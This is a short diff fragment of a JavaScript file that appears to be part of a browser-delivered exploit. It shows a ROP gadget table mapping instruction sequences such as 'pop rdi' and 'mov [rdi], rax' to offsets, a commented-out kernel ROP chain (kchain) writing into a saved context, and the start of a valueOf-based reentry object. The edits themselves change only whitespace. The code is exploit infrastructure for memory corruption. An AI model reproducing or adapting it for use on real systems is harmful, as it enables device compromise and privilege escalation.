@@ -70,8 +70,8 @@ var gadget = function(o)
       kchain.push(window.gadgets["pop rdi"]);
       kchain.push(savectx.add32(0x50));
       kchain.push(window.gadgets["mov [rdi], rax"]);
-      */
-          gadgets = {  
+      */        
+           gadgets = {  
   "ret":                    gadget(0x0000003C),
   "jmp rax":                gadget(0x00000082),
   "ep":                     gadget(0x000000AD),
@@ -99,7 +99,7 @@ var gadget = function(o)
   "memset":                 gadget(0x00000228),
   "setjmp":                 gadget(0x000014f8)
 };
-   
+  
 ;var reenter_help = { length:
     { valueOf: function(){
         return 0;
